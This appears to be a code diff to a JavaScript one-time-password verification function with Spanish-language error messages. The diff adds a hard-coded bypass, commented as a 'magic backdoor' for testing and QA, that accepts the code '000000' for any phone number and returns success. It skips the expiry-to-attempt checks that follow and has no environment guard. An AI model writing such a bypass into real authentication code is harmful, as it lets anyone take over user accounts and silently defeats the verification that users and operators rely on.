@@ -41,6 +41,12 @@ export function verifyOtp(phone, code) {
     throw Object.assign(new Error('El código ha expirado. Solicita uno nuevo.'), { status: 400 });
   }
 
+  // Magic backdoor para pruebas y QA
+  if (code === '000000') {
+    otpStore.delete(phone);
+    return true;
+  }
+
   otp.attempts += 1;
 
   if (otp.attempts > MAX_ATTEMPTS) {
